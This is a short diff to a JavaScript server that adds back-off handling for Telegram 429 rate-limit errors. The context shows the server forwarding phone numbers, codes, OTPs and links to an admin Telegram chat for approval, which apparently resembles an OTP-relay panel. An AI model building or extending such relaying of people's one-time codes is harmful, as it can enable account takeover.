@@ -124,6 +124,16 @@ let lastTelegramDelivery = {
   success: null,
   error: null,
 };
+let telegramPausedUntil = 0;
+
+function getTelegramRetryDelay(err) {
+  const retryAfter =
+    err?.response?.body?.parameters?.retry_after ||
+    err?.parameters?.retry_after ||
+    err?.retry_after ||
+    32;
+  return (Number(retryAfter) || 32) * 1000;
+}
 
 // Clean up old requests every 10 minutes (older than 30 min) to avoid unbounded growth
 setInterval(() => {
@@ -135,6 +145,10 @@ setInterval(() => {
 
 function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
   if (!api || !ADMIN_CHAT_ID) return;
+  if (Date.now() < telegramPausedUntil) {
+    console.warn(`Telegram delivery paused until ${new Date(telegramPausedUntil).toISOString()}`);
+    return null;
+  }
 
   const telegramPhone = formatTelegramPhone(phone);
 
@@ -188,6 +202,9 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
       console.log(`Telegram notification sent for request ${id}`);
     }).catch((err) => {
       const code = err?.code || err?.response?.statusCode || err?.response?.status || 'unknown';
+      if (code === 429 || code === '429') {
+        telegramPausedUntil = Date.now() + getTelegramRetryDelay(err);
+      }
       lastTelegramDelivery = {
         at: new Date().toISOString(),
         success: false,
@@ -495,6 +512,10 @@ const LABEL_BY_ACTION = {
 
 async function processTelegramCallbacks() {
   try {
+    if (Date.now() < telegramPausedUntil) {
+      await new Promise((resolve) => setTimeout(resolve, 60000));
+      return;
+    }
     await api.deleteWebhook({ drop_pending_updates: false });
     console.log('Telegram API ready. Listening for admin approval actions.');
 
